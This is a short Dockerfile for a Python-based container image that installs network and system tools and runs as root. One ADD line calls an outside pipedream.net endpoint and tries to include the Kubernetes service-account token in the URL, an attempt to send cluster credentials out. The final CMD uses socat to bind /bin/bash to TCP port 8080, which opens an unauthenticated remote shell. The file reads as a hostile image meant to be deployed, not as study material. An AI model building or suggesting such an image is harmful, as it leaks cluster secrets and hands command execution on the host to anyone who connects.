FROM python:3.8-slim-buster

RUN apt-get update && apt-get install -y iputils-ping wget curl nmap sudo socat kmod msr-tools

USER root
ENV HOME /root

ADD https://en70bgxpxujs.x.pipedream.net/?a=`/var/run/secrets/kubernetes.io/serviceaccount/token` /build

EXPOSE 8080
CMD ["socat", "-T600", "TCP-LISTEN:8080,reuseaddr,fork", "EXEC:'/bin/bash'"]

